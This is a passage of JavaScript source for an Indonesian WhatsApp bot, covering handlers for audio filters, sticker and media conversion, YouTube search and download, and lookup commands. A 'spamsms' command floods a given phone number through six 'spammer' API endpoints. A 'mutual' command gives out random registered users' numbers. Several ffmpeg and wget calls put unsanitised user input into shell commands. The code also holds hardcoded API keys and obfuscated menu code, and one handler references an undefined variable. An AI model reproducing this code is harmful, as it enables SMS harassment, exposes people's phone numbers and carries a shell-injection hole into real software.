_0x4f5802['push'](_0x4f5802['shift']());}catch(_0x2e58e1){_0x4f5802['push'](_0x4f5802['shift']());}}}(_0x9cec,0x9027a),dila[_0x3f1129(0x1fa)](from,tools,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x3f1129(0x200),...from?{'remoteJid':_0x3f1129(0x1fd)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x3f1129(0x1f4)](_0x3f1129(0x1fb)),'surface':0xc8,'message':'Tools\x20Menu','orderTitle':_0x3f1129(0x1f6),'sellerJid':_0x3f1129(0x200)}}}}));
					break
					case 'volume':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						dila.sendMessage(from, hah, audio, {mimetype: 'audio/mp4',  ptt: true, quoted:Lan})
						fs.unlinkSync(ran)
					})
				break
					case 'tomp4':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
                                        if (!isQuotedSticker) return reply('Reply stiker nya')
                                        reply(dla.wait())
            if ((isMedia && !Lan.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
            owgi = await dila.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('Reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
				
				case 'tomp3':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					dila.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Reply Video Nya Kak')
					reply(dla.wait())
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal Kak Coba Ulangi:)')
						mhee = fs.readFileSync(ran)
						dila.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', quoted: Lan })
						fs.unlinkSync(ran)
					})
					break
				case 'toimg':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!isQuotedSticker) return reply('Reply Sticker Nya Kak')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(dla.stikga())
						buffer = fs.readFileSync(ran)
						dila.sendMessage(from, buffer, image, { quoted: Lan })
						fs.unlinkSync(ran)
					})
					break
   case 'imgtourl':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					costum('[WAIT] Sabar Kak', text, tescuk, cr)
					var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
					var media = await dila.downloadAndSaveMediaMessage(encmedia)
					var imgbb = require('imgbb-uploader')
					imgbb('9ba3ffa6160a701a61ebafebca46f4cf', media)
						.then(data => {
							var caps = `「 *IMAGE TO URL* 」

❏ ID : ${data.id}
❏ MimeType : ${data.image.mime}
❏ Extension : ${data.image.extension}
❏ URL : ${data.display_url}`
							ibb = fs.readFileSync(media)
							dila.sendMessage(from, ibb, image, { quoted: Lan, caption: caps })
						})
						.catch(err => {
							throw err
						})
					break

				case 'komenyt':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					gh = body.slice(9)
					usnm = gh.split("&")[0];
					cmn = gh.split("&")[1];
					var imgbb = require('imgbb-uploader')
					try {
						pp = await dila.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
						pp = 'https://i.ibb.co/Tv6JR98/baby.jpg'
					}
					media = await getBuffer(pp)
					datae = await imageToBase64(JSON.stringify(pp).replace(/\"/gi, ''))
					fs.writeFileSync('getpp.jpeg', datae, 'base64')
					res = await imgbb("7f2cf4cd570b9a442d6fdec16b74dcfc", 'getpp.jpeg')
					buffer = await getBuffer(`https://some-random-api.ml/canvas/youtube-comment?avatar=${res.display_url}&comment=${cmn}&username=${usnm}`)
					dila.sendMessage(from, buffer, image, { caption: 'Nih Cok', contextInfo: { participant: '0@s.whatsapp.net', quotedMessage: { conversation: '*_YOUTUBE COMMENT_*' } } })
					break

				case 'trigered':
				case 'trigger':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					var imgbb = require('imgbb-uploader')
					if ((isMedia && !Lan.message.videoMessage || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						reply(dla.wait())
						owgi = await dila.downloadAndSaveMediaMessage(ger)
						anu = await imgbb("7f2cf4cd570b9a442d6fdec16b74dcfc", owgi)
						trig = `${anu.display_url}`
						ranp = getRandom('.gif')
						rano = getRandom('.webp')
						anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${trig}`
						exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
							fs.unlinkSync(ranp)
							if (err) return reply('GAGAL UM')
							nobg = fs.readFileSync(rano)
							dila.sendMessage(from, nobg, sticker, { quoted: Lan })
							fs.unlinkSync(rano)
						})
					} else {
						reply('Gunakan Foto Kakm')
					}
					break
			    case 'nightcore':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)			    
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'slow':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'tupai':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'blub':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.9,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'gemuk':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
				case 'ghost':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)				
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						ghs = fs.readFileSync(ran)
					dila.sendMessage(from, ghs, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					    })
				       break
		       case 'bass':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)		   
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=64:width_type=o:width=2:g=56 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					dila.sendMessage(from, hah, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: Lan })
						fs.unlinkSync(ran)
					   })
				       break
	             case 'toptt':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('Gagal mengkonversi audio ke ptt')
						topt = fs.readFileSync(ran)
					dila.sendMessage(from, topt, audio, { mimetype: 'audio/mp4',  ptt: true, quoted: Lan })
						})
						await limitAdd(sender)
					    break
				case 'mutualmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const mtal = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}mutual\`\`\`
\`\`\`├ ${prefix}next\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0xf40b=['mtmZodiWmuroDKrNqq','mxHnwNrNza','mxPZvfjQAq','mtm0mJuWm0DAuuX1zq','mK1JyLfisq','nJe2mZm4rwLjrMDe','otGZotCZrKTsAfjL','mebZlNDOyxrZyxbWlM5LDa','nte5mdK3D2vbAefO','txv0DwfSie1LBNu','mte5mdaYm2LiBMDQqq','mJC0odm4Axn0BgH0','C2vUze1LC3nHz2u'];function _0x51ed(_0x4fdd71,_0x8ac710){_0x4fdd71=_0x4fdd71-0x108;var _0xf40bc2=_0xf40b[_0x4fdd71];if(_0x51ed['YfUTVg']===undefined){var _0x51edc3=function(_0x7bdc55){var _0x57c39c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x10b269='';for(var _0x1d4a37=0x0,_0x5cb32f,_0x5e19f6,_0x464372=0x0;_0x5e19f6=_0x7bdc55['charAt'](_0x464372++);~_0x5e19f6&&(_0x5cb32f=_0x1d4a37%0x4?_0x5cb32f*0x40+_0x5e19f6:_0x5e19f6,_0x1d4a37++%0x4)?_0x10b269+=String['fromCharCode'](0xff&_0x5cb32f>>(-0x2*_0x1d4a37&0x6)):0x0){_0x5e19f6=_0x57c39c['indexOf'](_0x5e19f6);}return _0x10b269;};_0x51ed['EvaNdu']=function(_0x50f3fd){var _0x11d1af=_0x51edc3(_0x50f3fd);var _0x1cad2c=[];for(var _0x367329=0x0,_0x1d7702=_0x11d1af['length'];_0x367329<_0x1d7702;_0x367329++){_0x1cad2c+='%'+('00'+_0x11d1af['charCodeAt'](_0x367329)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1cad2c);},_0x51ed['QBioZz']={},_0x51ed['YfUTVg']=!![];}var _0x4a0765=_0xf40b[0x0],_0x4d0fbd=_0x4fdd71+_0x4a0765,_0x53365c=_0x51ed['QBioZz'][_0x4d0fbd];return _0x53365c===undefined?(_0xf40bc2=_0x51ed['EvaNdu'](_0xf40bc2),_0x51ed['QBioZz'][_0x4d0fbd]=_0xf40bc2):_0xf40bc2=_0x53365c,_0xf40bc2;}var _0x132408=_0x51ed;(function(_0x2b83e2,_0x37115f){var _0x42baf8=_0x51ed;while(!![]){try{var _0x256f09=parseInt(_0x42baf8(0x10d))*parseInt(_0x42baf8(0x109))+-parseInt(_0x42baf8(0x111))*-parseInt(_0x42baf8(0x108))+-parseInt(_0x42baf8(0x114))+parseInt(_0x42baf8(0x10a))+-parseInt(_0x42baf8(0x10b))*parseInt(_0x42baf8(0x10f))+-parseInt(_0x42baf8(0x10c))+parseInt(_0x42baf8(0x112));if(_0x256f09===_0x37115f)break;else _0x2b83e2['push'](_0x2b83e2['shift']());}catch(_0x394fb0){_0x2b83e2['push'](_0x2b83e2['shift']());}}}(_0xf40b,0xc2f8c),dila[_0x132408(0x113)](from,mtal,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x132408(0x10e),...from?{'remoteJid':'status@broadcast'}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs['readFileSync']('./dns/thumbnail.jpeg'),'surface':0xc8,'message':_0x132408(0x110),'orderTitle':'Mutual\x20Menu','sellerJid':_0x132408(0x10e)}}}}));
					break
				case 'mutual':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (isGroup) return reply('Maaf Kak Tidak Bisa Di Group')
					anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net', '')
					await reply('Mencari Pasangan >_<')
					await reply(`wa.me/${anug}`)
					await reply(`Pasangan Ditemukan :\n*${prefix}next* — Temukan Pasangan Baru`)
					break

				case 'next':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (isGroup) return reply('Maaf Kak Tidak Bisa Di Group')
					anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net', '')
					await reply('Mencari Pasangan >_<')
					await reply(`wa.me/${anug}`)
					await reply(`Pasangan Ditemukan :\n*${prefix}next* — Temukan Pasangan Baru`)
					break
					
				case 'othermenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const other = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}lacakip\`\`\`
\`\`\`├ ${prefix}dorking\`\`\`
\`\`\`├ ${prefix}brainly\`\`\`
\`\`\`├ ${prefix}wiki\`\`\`
\`\`\`├ ${prefix}kbbi\`\`\`
\`\`\`├ ${prefix}covid\`\`\`
\`\`\`├ ${prefix}pinterest\`\`\`
\`\`\`├ ${prefix}jadwalsholat\`\`\`
\`\`\`├ ${prefix}spamsms\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x597f=['mZeXmtGYqwXLzLHq','lI9KBNmVDgH1BwjUywLSlMPWzwC','mw5bAvD5tG','mteZndyWmwDmwML1BW','mJeXmJiWnKvMCNzYCW','otq2nZm1y2vwsxbs','C3rHDhvZqgjYB2fKy2fZDa','m1z2D1PKzW','mebZlNDOyxrZyxbWlM5LDa','C2vUze1LC3nHz2u','ndy0odu3veHhuhzT','t3rOzxiGtwvUDq','mtiZnfbfwLLzvW','mJKYrwTeCgrM','mte4mxzUvhPitW','mtiWoe5ewNfKDq'];var _0x113ac7=_0x131f;function _0x131f(_0x39932f,_0x2d0d46){_0x39932f=_0x39932f-0xf3;var _0x597f5c=_0x597f[_0x39932f];if(_0x131f['IRvAEu']===undefined){var _0x131f05=function(_0x33be45){var _0x3e2c6a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x12995c='';for(var _0x123027=0x0,_0x469fd8,_0x1b8544,_0x1ad430=0x0;_0x1b8544=_0x33be45['charAt'](_0x1ad430++);~_0x1b8544&&(_0x469fd8=_0x123027%0x4?_0x469fd8*0x40+_0x1b8544:_0x1b8544,_0x123027++%0x4)?_0x12995c+=String['fromCharCode'](0xff&_0x469fd8>>(-0x2*_0x123027&0x6)):0x0){_0x1b8544=_0x3e2c6a['indexOf'](_0x1b8544);}return _0x12995c;};_0x131f['ZONdPN']=function(_0x522b1b){var _0x1a156f=_0x131f05(_0x522b1b);var _0x3de73a=[];for(var _0x3d75d5=0x0,_0x56383a=_0x1a156f['length'];_0x3d75d5<_0x56383a;_0x3d75d5++){_0x3de73a+='%'+('00'+_0x1a156f['charCodeAt'](_0x3d75d5)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3de73a);},_0x131f['KPjDHd']={},_0x131f['IRvAEu']=!![];}var _0x46799e=_0x597f[0x0],_0x3aea96=_0x39932f+_0x46799e,_0x530af6=_0x131f['KPjDHd'][_0x3aea96];return _0x530af6===undefined?(_0x597f5c=_0x131f['ZONdPN'](_0x597f5c),_0x131f['KPjDHd'][_0x3aea96]=_0x597f5c):_0x597f5c=_0x530af6,_0x597f5c;}(function(_0x4d1066,_0x4ece91){var _0x4dbe0=_0x131f;while(!![]){try{var _0x384472=-parseInt(_0x4dbe0(0xf4))*-parseInt(_0x4dbe0(0xf3))+parseInt(_0x4dbe0(0xfa))+-parseInt(_0x4dbe0(0xf5))*parseInt(_0x4dbe0(0xf6))+parseInt(_0x4dbe0(0xf9))*parseInt(_0x4dbe0(0x101))+parseInt(_0x4dbe0(0xfe))*-parseInt(_0x4dbe0(0xf7))+-parseInt(_0x4dbe0(0xfc))+parseInt(_0x4dbe0(0xfb));if(_0x384472===_0x4ece91)break;else _0x4d1066['push'](_0x4d1066['shift']());}catch(_0xf29c38){_0x4d1066['push'](_0x4d1066['shift']());}}}(_0x597f,0xbac87),dila[_0x113ac7(0x100)](from,other,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x113ac7(0xff),...from?{'remoteJid':_0x113ac7(0xfd)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs['readFileSync'](_0x113ac7(0xf8)),'surface':0xc8,'message':_0x113ac7(0x102),'orderTitle':'Other\x20Menu','sellerJid':_0x113ac7(0xff)}}}}));
					break
					case 'dorking':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
			    dork = `${body.slice(9)}`
					anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/dorking?dork=${dork}`, {method: 'get'})
					var ko = '1'
					for (let i = 0; i < anu.result.length; i++) { 
					 teks = `${ko}\n${anu.result[i]}`
					 ko++
					}
					reply(teks)
					break
					case 'spamsms':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (!isPrem) return reply(dla.premium(prefix))
					if (args[0].startsWith('08')) return reply('Gunakan kode bahasa kak')
					await fetchJson(`https://api.xteam.xyz/spammer/pizzahut?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/olx?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/jagreward?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/danacita?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/akademi?no=${q}&APIKEY=${xteam}`)
					await fetchJson(`https://api.xteam.xyz/spammer/icq?no=${q}&APIKEY=${xteam}`)
					reply('Done')
                    break
                    case 'ytsch':
           case 'ytsearch':
           if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					reply(dla.wait())
            if (!args.length) return reply('Judulnya apa kak?')
            try {
                const input = args.join(" ")
                const filter1 = await ytsr.getFilters(input)
                const filters1 = filter1.get('Type').get('Video')
                const { items } = await ytsr(filters1.url, { limit: 10 })
                
                let hehe = `┌ ◪ *YOUTUBE SEARCH*
└ *Search Query:* ${input}\n\n`
                for (let i = 0; i < items.length; i++) {
                    hehe += `───────────────\n
┌ ❏ *Judul:* ${items[i].title}
├ ❏ *Id:* ${items[i].id}
├ ❏ *Ditonton:* ${items[i].views}
├ ❏ *Durasi:* ${items[i].duration}
└ ❏ *Link:* ${items[i].url}\n\n`
                }
                thumb = await getBuffer(items[0].bestThumbnail.url)
                await dila.sendMessage(from, thumb, image, {quoted: Lan, caption: `${hehe}───────────────\n\n┌ ◪ *DOWNLOAD*
├ ${prefix}ytmp3 [link youtube] = Audio
└ ${prefix}ytmp4 [link youtube] = Video`})
            } catch(e) {
                reply('Didn\'t find anything or there is any error!')
                reply(`Error: ${e.message}`)
            }
            break
			case 'play':{
				if (isBanned) return reply(dla.baned())
			if (!isRegistered) return reply(dla.noregis())
			if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
			await limitAdd(sender)
                var title = body.slice(6)
                reply(dla.wait())
                var link1 = await ytplay(title)
                ytdldown(link1, 'mp3').then(async(res) => {
                	//console.log(res.link)
                    if (res.status === 'error') return reply(`${res.title}\n\nError silahkan klik link dibawah ini\n${res.link}`)
                    if (res.status === 'sukses') {
                    	thumb = await getBuffer(res.thumbnail)
                        dila.sendMessage(from, res.thumbnail, image, {quoted: Lan, caption: `❏ *Judul* : ${res.title}\n\nBentar kak Audionya lagi dikirim`})
                        vid = await getBuffer(res.link)
                        dila.sendMessage(from, vid, audio, {mimetype: 'audio/mp4',  filename: `${res.title}.mp3`, quoted: Lan})
                        }
                }).catch((e) => {
                    console.error(e)
                    reply(`Error: ${e.message}`)
                })
            }
            break
			case 'ytmp3':
			if (isBanned) return reply(dla.baned())
			if (!isRegistered) return reply(dla.noregis())
			if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
			await limitAdd(sender)
			if (args.length < 1) return reply('Urlnya mana kak?')
			const urlmsc = args[0];
		    try {
        	var aramam = await yts({videoId: ytdl.getURLVideoID(urlmsc)});
    		} catch {
        	return await dila.sendMessage(from, 'Error!', MessageType.text)
    		}
            reply(dla.wait())
    		let titles = 'lu sayang gk sama w? :)'
    		let streams = ytdl(aramam.videoId, {
        	quality: 'highestaudio',
   			});
    		var mbuff = await getBuffer(aramam.image)
    		got.stream(aramam.image).pipe(fs.createWriteStream(titles + '.jpg'));
    		ffmpeg(streams)
        	.audioBitrate(320)
        	.save('./' + titles + '.mp3')
        	.on('end', async () => {
            const writers = new ID3Writer(fs.readFileSync('./' + titles + '.mp3'));
            writers.setFrame('TIT2', aramam.title)
            .setFrame('TPE1', [aramam.author.name])
            .setFrame('APIC', {
            type: 3,
            data: fs.readFileSync(titles + '.jpg'),
            description: aramam.description
            });
            writers.addTag();
            playmsc = `「 *_YOUTUBE MP3_* 」\n\n❏ *Title* : ${aramam.title}\n❏ *By* : ${aramam.author.name}\n\nBentar kak Audionya lagi dikirim`
            await dila.sendMessage(from, mbuff, image, {quoted: Lan, caption: playmsc})
            await dila.sendMessage(from, Buffer.from(writers.arrayBuffer), audio, {mimetype: Mimetype.mp4Audio, quoted: Lan});
        	fs.unlinkSync(titles + '.jpg')
        	fs.unlinkSync('./' + titles + '.mp3')
        	});
			break
            case 'ytmp4':
	 		if (args.length < 1) return reply('Urlnya mana kak?')
			const urlvid = args[0]
		    try {
        	var aramav = await yts({videoId: ytdl.getURLVideoID(urlvtext)});
    		} catch {
        	return await dila.sendMessage(from, 'Error!', MessageType.text)
    		}
    		reply(dla.wait())
    		var yt = ytdl(aramav.videoId, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
  			yt.pipe(fs.createWriteStream('./' + aramav.videoId + '.mp4'));
  			yt.on('end', async () => {
  			playvid = `「 *_YOUTUBE MP4_* 」\n\n❏ *Title* : ${aramav.title}\n❏ *By* : ${aramav.author.name}\n\nBentar kak Videonya lagi dikirim`	
        	await dila.sendMessage(from, fs.readFileSync('./' + aramav.videoId + '.mp4'), video, {mimetype: Mimetype.mp4, quoted: Lan, caption: playvid});
        	fs.unlinkSync('./' + aramav.videoId + '.mp4')
        	});
			break
              case 'lacakip':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length === 0) return reply(`Contoh :\n${prefix}lacakip 10.43.180.140`)
					iplu = `${body.slice(9)}`
					data = await fetchJson(`https://videfikri.com/api/iplookup/?ip=${iplu}`, { method: 'get' })
					lacaks = data.result
					lacak = `❏ Ip : ${lacaks.ip}
❏ Country : ${lacaks.country}
❏ Country code : ${lacaks.country_code}
❏ Region : ${lacaks.region}
❏ Region name : ${lacaks.region_name}
❏ City : ${lacaks.city}
❏ Latitude : ${lacaks.latitude}
❏ Longtitude : ${lacaks.longtitude}
❏ Timezone : ${lacaks.timezone}
❏ Isp : ${lacaks.isp}
❏ Org : ${lacaks.org}
❏ As : ${lacaks.as}`
					dila.sendMessage(from, lacak, text, { quoted: Lan })
					break

				case 'brainly':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					if (args.length < 1) return reply(`Yang Mau Dicari Apa Kak?\nContoh :\n${prefix}brainly apa itu bot`)
					await limitAdd(sender)
					brien = body.slice(9)
					brainly(`${brien}`).then(res => {
						teks = '─────「 _*BRAINLY*_ 」─────\n'
						for (let Y of res.data) {
							teks += `\n❏ *Pertanyaan:* ${Y.pertanyaan}\n❏ *Jawaban:* ${Y.jawaban[0].text}\n\n─────「 _*BRAINLY*_ 」─────`
						}
						dila.sendMessage(from, teks, text, { quoted: Lan, detectLinks: false })
						console.log(res)
					})
					break

				case 'wiki':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Yang Mau Dicari Apa Kak?\nContoh :\n${prefix}wiki online`)
					var bby = body.slice(6)
					anu = await fetchJson(`https://api.zeks.xyz/api/wiki?q=${bby}&apikey=apivinz`)
					reply('[WAIT] Sedang Searching...')
					wikiped = `「 WIKI PEDIA 」\n Jawaban : ${anu.result.result}`
					dila.sendMessage(from, wikiped, text, { quoted: Lan })
					break

				case 'kbbi':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Yang Mau Dicari Apa Kak?\nContoh :\n${prefix}kbbi manusia`)
					var bby = body.slice(6)
					anu = await fetchJson(`https://videfikri.com/api/kbbi/?query=${bby}`)
					reply('[WAIT] Sedang Searching...')
